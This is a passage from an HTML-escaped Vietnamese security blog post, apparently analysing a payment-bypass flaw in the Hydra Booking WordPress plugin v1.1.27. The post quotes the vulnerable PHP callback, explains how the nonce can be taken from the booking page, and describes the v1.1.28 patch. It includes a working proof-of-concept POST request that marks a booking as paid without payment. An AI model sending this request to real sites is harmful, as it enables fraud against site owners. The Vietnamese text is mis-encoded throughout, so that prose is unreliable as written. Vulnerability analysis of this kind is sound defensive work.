c·∫≠p:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=hydra-booking#/bookings/details/{booking_id}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/status.png&#34; title=&#34;Booking status&#34; data-thumbnail=&#34;/posts/2026-01-15-cve-2025-12788/status.png&#34; data-sub-html=&#34;&lt;h2&gt;Booking status&lt;/h2&gt;&lt;p&gt;Booking status&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-15-cve-2025-12788/status.png&#39; alt=&#34;Booking status&#34; height=&#34;952&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Booking status&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;·ªû ƒë√¢y ta th·∫•y Payment ƒëang ·ªü tr·∫°ng th√°i &lt;code&gt;pending&lt;/code&gt;, sau khi thanh to√°n tr·∫°ng th√°i s·∫Ω chuy·ªÉn sang &lt;code&gt;complete&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;payment&#34;&gt;&lt;span&gt;Payment&lt;/span&gt;&#xA;  &lt;a href=&#34;#payment&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω action hook d√†nh cho vi·ªác thanh to√°n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_tfhb_meeting_paypal_payment_confirmation&amp;#39;, array( $this, &amp;#39;tfhb_meeting_paypal_payment_confirmation_callback&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; l√† hook d√†nh cho t·∫•t c·∫£ ng∆∞·ªùi d√πng (k·ªÉ c·∫£ ch∆∞a ƒëƒÉng nh·∫≠p), khi c√≥ request ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=tfhb_meeting_paypal_payment_confirmation&lt;/code&gt; th√¨ callback &lt;code&gt;tfhb_meeting_paypal_payment_confirmation_callback&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω vi·ªác thanh to√°n.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function tfhb_meeting_paypal_payment_confirmation_callback(){&#xA;    // Checked Nonce validation.&#xA;    if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;tfhb_nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html(__(&amp;#39;Nonce verification failed&amp;#39;, &amp;#39;hydra-booking&amp;#39;)) ) );&#xA;    }&#xA;&#xA;    // Check if the request is POST.&#xA;    if ( &amp;#39;POST&amp;#39; !== $_SERVER[&amp;#39;REQUEST_METHOD&amp;#39;] ) {&#xA;        wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html(__(&amp;#39;Invalid request method&amp;#39;, &amp;#39;hydra-booking&amp;#39;)) ) );&#xA;    }&#xA;&#xA;    // Check if the request is not empty.&#xA;    if ( empty( $_POST ) ) {&#xA;        wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html(__(&amp;#39;Invalid request&amp;#39;, &amp;#39;hydra-booking&amp;#39;)) ) );&#xA;    }&#xA;    $payment_details = isset( $_POST[&amp;#39;payment_details&amp;#39;] ) ? $_POST[&amp;#39;payment_details&amp;#39;] : array();&#xA;    $responseData = isset( $_POST[&amp;#39;responseData&amp;#39;] ) ? $_POST[&amp;#39;responseData&amp;#39;] : array();&#xA;&#xA;    &#xA;    $payment_id = isset( $payment_details[&amp;#39;id&amp;#39;] ) ? sanitize_text_field( $payment_details[&amp;#39;id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $payer_id = isset( $payment_details[&amp;#39;payer&amp;#39;][&amp;#39;payer_id&amp;#39;] ) ? sanitize_text_field( $payment_details[&amp;#39;payer&amp;#39;][&amp;#39;payer_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $hash = isset( $responseData[&amp;#39;data&amp;#39;][&amp;#39;hash&amp;#39;] ) ? sanitize_text_field( $responseData[&amp;#39;data&amp;#39;][&amp;#39;hash&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $booking_id = isset( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking_id&amp;#39;] ) ? sanitize_text_field( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $attendee_id = isset( $responseData[&amp;#39;data&amp;#39;][&amp;#39;attendee_id&amp;#39;] ) ? sanitize_text_field( $responseData[&amp;#39;data&amp;#39;][&amp;#39;attendee_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $meeting_id = isset( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking&amp;#39;][&amp;#39;meeting_id&amp;#39;] ) ? sanitize_text_field( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking&amp;#39;][&amp;#39;meeting_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#x9;&#xA;    $host_id = isset( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking&amp;#39;][&amp;#39;host_id&amp;#39;] ) ? sanitize_text_field( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking&amp;#39;][&amp;#39;host_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#x9;&#xA;    $customer_id = isset( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking&amp;#39;][&amp;#39;attendee_id&amp;#39;] ) ? sanitize_text_field( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking&amp;#39;][&amp;#39;attendee_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#x9;&#xA;    $payment_method = isset( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking&amp;#39;][&amp;#39;payment_method&amp;#39;] ) ? sanitize_text_field( $responseData[&amp;#39;data&amp;#39;][&amp;#39;booking&amp;#39;][&amp;#39;payment_method&amp;#39;] ) : &amp;#39;&amp;#39;;&#x9;&#xA;    $total =  isset($payment_details[&amp;#39;purchase_units&amp;#39;][0][&amp;#39;amount&amp;#39;][&amp;#39;value&amp;#39;]) ? sanitize_text_field( $payment_details[&amp;#39;purchase_units&amp;#39;][0][&amp;#39;amount&amp;#39;][&amp;#39;value&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    &#xA;    $attendee     = new  Attendees();&#xA;&#xA;    $attendeedata = array(&#xA;        &amp;#39;id&amp;#39;             =&amp;gt; $attendee_id,&#xA;        &amp;#39;payment_status&amp;#39; =&amp;gt; &amp;#39;Completed&amp;#39;,&#xA;    );&#xA;    &#xA;    // attendee Update&#xA;    $attendeeUpdate = $attendee-&amp;gt;update( $attendeedata );&#xA;&#xA;    $charge = array(&#xA;        &amp;#39;payment_id&amp;#39;    =&amp;gt; ! empty( $payment_id ) ? $payment_id : &amp;#39;&amp;#39;, &#xA;        &amp;#39;payer_id&amp;#39;      =&amp;gt; ! empty( $payer_id  ) ? $payer_id  : &amp;#39;&amp;#39;,&#xA;        &amp;#39;booking_id&amp;#39;      =&amp;gt; ! empty( $booking_id  ) ? $booking_id  : &amp;#39;&amp;#39;, &#xA;        &amp;#39;attendee_id&amp;#39;      =&amp;gt; ! empty( $attendee_id  ) ? $attendee_id  : &amp;#39;&amp;#39;, &#xA;    );&#xA;    // Data for Transactions Table&#xA;    $tdata        = array(&#xA;        &amp;#39;booking_id&amp;#39;         =&amp;gt; $booking_id,&#xA;        &amp;#39;attendee_id&amp;#39;         =&amp;gt; $attendee_id,&#xA;        &amp;#39;meeting_id&amp;#39;         =&amp;gt; $meeting_id,&#xA;        &amp;#39;host_id&amp;#39;         =&amp;gt; $host_id,&#xA;        &amp;#39;customer_id&amp;#39;         =&amp;gt; $booking_id,&#xA;        &amp;#39;payment_method&amp;#39;         =&amp;gt; $payment_method, &#xA;        &amp;#39;total&amp;#39;         =&amp;gt; $total,&#xA;        &amp;#39;transation_history&amp;#39; =&amp;gt; wp_json_encode( $charge ),&#xA;        &amp;#39;status&amp;#39; =&amp;gt; &amp;#39;completed&amp;#39;,&#xA;    );&#xA;&#xA;    $Transactions = new Transactions();&#xA;    $Transactions = $Transactions-&amp;gt;add( $tdata );&#xA;&#xA;    // After Booking Hooks&#xA;    do_action( &amp;#39;hydra_booking/after_booking_payment_complete&amp;#39;, $attendeedata );&#xA;&#xA;    // return success message&#xA;    $response[&amp;#39;message&amp;#39;] = esc_html(__(&amp;#39;Payment Completed Successfully&amp;#39;, &amp;#39;hydra-booking&amp;#39;));&#xA;    wp_send_json_success( $response );&#xA;    &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán check nonce ch·ªëng &lt;strong&gt;CSRF&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;tfhb_nonce&amp;#39; ) ) {&#xA;    wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html(__(&amp;#39;Nonce verification failed&amp;#39;, &amp;#39;hydra-booking&amp;#39;)) ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;tfhb_nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/nonce.png&#34; title=&#34;T·∫°o nonce&#34; data-thumbnail=&#34;/posts/2026-01-15-cve-2025-12788/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;T·∫°o nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-15-cve-2025-12788/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;658&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;C√≥ th·ªÉ th·∫•y nonce ƒë∆∞·ª£c t·∫°o ra v√† g√°n v√†o ƒë·ªëi t∆∞·ª£ng &lt;code&gt;tfhb_app_booking&lt;/code&gt;, sau ƒë√≥ ƒë∆∞·ª£c tr·∫£ v·ªÅ trong response khi ng∆∞·ªùi d√πng truy c·∫≠p trang booking.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/nonce_res.png&#34; title=&#34;Nonce trong response&#34; data-thumbnail=&#34;/posts/2026-01-15-cve-2025-12788/nonce_res.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce res&lt;/h2&gt;&lt;p&gt;Nonce trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-15-cve-2025-12788/nonce_res.png&#39; alt=&#34;Nonce res&#34; height=&#34;709&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta s·ª≠ d·ª•ng gi√° tr·ªã n√†y ƒë·ªÉ bypass b∆∞·ªõc ki·ªÉm tra nonce.&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo, h√†m ki·ªÉm tra method c√≥ ph·∫£i l√† &lt;strong&gt;POST&lt;/strong&gt; v√† kh√¥ng r·ªóng th√¨ cho ph√©p th·ª±c hi·ªán c√°c logic ph√≠a sau&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( &amp;#39;POST&amp;#39; !== $_SERVER[&amp;#39;REQUEST_METHOD&amp;#39;] ) {&#xA;    wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html(__(&amp;#39;Invalid request method&amp;#39;, &amp;#39;hydra-booking&amp;#39;)) ) );&#xA;}&#xA;&#xA;// Check if the request is not empty.&#xA;if ( empty( $_POST ) ) {&#xA;    wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html(__(&amp;#39;Invalid request&amp;#39;, &amp;#39;hydra-booking&amp;#39;)) ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÉm ƒë√°ng ch√∫ √Ω v√† nguy hi·ªÉm nh·∫•t n·∫±m ·ªü ƒëo·∫°n code n√†y:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$attendeedata = array(&#xA;    &amp;#39;id&amp;#39;             =&amp;gt; $attendee_id,&#xA;    &amp;#39;payment_status&amp;#39; =&amp;gt; &amp;#39;Completed&amp;#39;,&#xA;);&#xA;&#xA;// attendee Update&#xA;$attendeeUpdate = $attendee-&amp;gt;update( $attendeedata );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;H√†m tr·ª±c ti·∫øp c·∫≠p nh·∫≠t tr·∫°ng th√°i thanh to√°n c·ªßa attendee th√†nh &lt;code&gt;Completed&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ c·∫ßn c√≥ &lt;code&gt;attendee_id&lt;/code&gt; g·ª≠i l√™n t·ª´ client =&amp;gt; h·ªá th·ªëng s·∫Ω coi nh∆∞ ƒë√£ thanh to√°n th√†nh c√¥ng. (&lt;code&gt;responseData[data][attendee_id]={id}&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;attendee_id&lt;/code&gt; s·∫Ω c√≥ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;responseData[data][attendee_id]={id}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° &lt;code&gt;v1.1.28&lt;/code&gt; ƒë√£ &lt;strong&gt;kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ l·ªói bypass thanh to√°n&lt;/strong&gt; b·∫±ng c√°ch th√™m &lt;strong&gt;x√°c minh ph√≠a m√°y ch·ªß v·ªõi PayPal&lt;/strong&gt; v√† &lt;strong&gt;r√†ng bu·ªôc ch·∫∑t ch·∫Ω d·ªØ li·ªáu booking trong h·ªá th·ªëng&lt;/strong&gt;, c·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2026-01-15-cve-2025-12788/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-15-cve-2025-12788/patch.png&#39; alt=&#34;Patch&#34; height=&#34;1077&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kh√¥ng c√≤n tin d·ªØ li·ªáu t·ª´ client&lt;/strong&gt;: ki·ªÉm tra &lt;code&gt;booking_id&lt;/code&gt;, &lt;code&gt;attendee_id&lt;/code&gt;, &lt;code&gt;hash&lt;/code&gt;, &lt;code&gt;payment_method&lt;/code&gt; v·ªõi d·ªØ li·ªáu trong DB.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;X√°c th·ª±c c·∫•u h√¨nh PayPal h·ª£p l·ªá&lt;/strong&gt; tr∆∞·ªõc khi x·ª≠ l√Ω.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;G·ªçi PayPal API ƒë·ªÉ x√°c minh giao d·ªãch th·∫≠t&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;L·∫•y &lt;strong&gt;access token&lt;/strong&gt; qua OAuth.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy v·∫•n &lt;strong&gt;order details&lt;/strong&gt; b·∫±ng &lt;code&gt;payment_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ki·ªÉm tra:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;tr·∫°ng th√°i order = &lt;strong&gt;COMPLETED&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;payer_id&lt;/code&gt; kh·ªõp&lt;/li&gt;&#xA;&lt;li&gt;s·ªë ti·ªÅn v√† ti·ªÅn t·ªá kh·ªõp v·ªõi booking&lt;/li&gt;&#xA;&lt;li&gt;tr·∫°ng th√°i capture = &lt;strong&gt;COMPLETED&lt;/strong&gt; (n·∫øu c√≥)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ch·ªâ sau khi x√°c minh th√†nh c√¥ng m·ªõi c·∫≠p nh·∫≠t&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;payment_status = Completed&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;booking status = confirmed&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;ghi/ c·∫≠p nh·∫≠t transaction v√†o DB&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;NgƒÉn double payment&lt;/strong&gt;: n·∫øu ƒë√£ &lt;code&gt;Completed&lt;/code&gt; th√¨ kh√¥ng x·ª≠ l√Ω l·∫°i.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nh·ªù ƒë√≥, vi·ªác &lt;strong&gt;gi·∫£ m·∫°o request t·ª´ client kh√¥ng c√≤n ƒë·ªß ƒë·ªÉ x√°c nh·∫≠n thanh to√°n&lt;/strong&gt;, v√† tr·∫°ng th√°i ‚Äúƒë√£ thanh to√°n‚Äù ch·ªâ ƒë∆∞·ª£c thi·∫øt l·∫≠p khi &lt;strong&gt;PayPal x√°c nh·∫≠n giao d·ªãch h·ª£p l·ªá ph√≠a server&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Perform Booking ‚Üí generate booking_id &amp;amp; attendee_id&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Access booking page&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Receive nonce (tfhb_nonce) from response&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Send POST request to admin-ajax.php&amp;lt;br/&amp;gt;action=tfhb_meeting_paypal_payment_confirmation&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Server checks nonce and POST method&amp;#34;]&#xA;&#xA;F --&amp;gt;|Pass| G[&amp;#34;Read client-controlled responseData[data][attendee_id]&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;No server-side verification with PayPal API&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Update attendee.payment_status = Completed&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Insert transaction record using client data&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Trigger after_booking_payment_complete hook&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Booking marked as paid&amp;#34;]&#xA;&#xA;F --&amp;gt;|Fail| M[&amp;#34;Request rejected&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Th·ª±c hi·ªán booking&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;G·ª≠i request thanh to√°n:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;action=tfhb_meeting_paypal_payment_confirmation&amp;amp;nonce=8f5959255a&amp;amp;responseData[data][attendee_id]=5&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-15-cve-2025-12788/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-15-cve-2025-12788/result.png&#39; alt=&#34;Result&#34; height=&#34;1011&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong Hydra Booking v1.1.27 xu·∫•t ph√°t t·ª´ &lt;strong&gt;l·ªói logic nghi·ªáp v·ª•&lt;/strong&gt;, khi h·ªá th·ªëng &lt;strong&gt;tin t∆∞·ªüng d·ªØ li·ªáu x√°c nh·∫≠n thanh to√°n do client g·ª≠i l√™n&lt;/strong&gt; v√† c·∫≠p nh·∫≠t tr·∫°ng th√°i thanh to√°n th√†nh &lt;strong&gt;Completed&lt;/strong&gt; m√† &lt;strong&gt;kh√¥ng x√°c minh giao d·ªãch v·ªõi PayPal ph√≠a m√°y ch·ªß&lt;/strong&gt;. Do endpoint x√°c nh·∫≠n thanh to√°n cho ph√©p &lt;strong&gt;truy c·∫≠p kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p&lt;/strong&gt; v√† nonce c√≥ th·ªÉ l·∫•y tr·ª±c ti·∫øp t·ª´ trang booking, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ &lt;strong&gt;t·ª± t·∫°o request POST&lt;/strong&gt; ƒë·ªÉ ƒë√°nh d·∫•u booking l√† ƒë√£ thanh to√°n m√† kh√¥ng c·∫ßn th·ª±c hi·ªán giao d·ªãch th·∫≠t.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ·ªü phi√™n b·∫£n v1.1.28 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch &lt;strong&gt;x√°c minh giao d·ªãch v·ªõi PayPal API&lt;/strong&gt; v√† &lt;strong&gt;ƒë·ªëi chi·∫øu d·ªØ li·ªáu booking trong c∆° s·ªü d·ªØ li·ªáu&lt;/strong&gt; tr∆∞·ªõc khi c·∫≠p nh·∫≠t tr·∫°ng th√°i thanh to√°n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 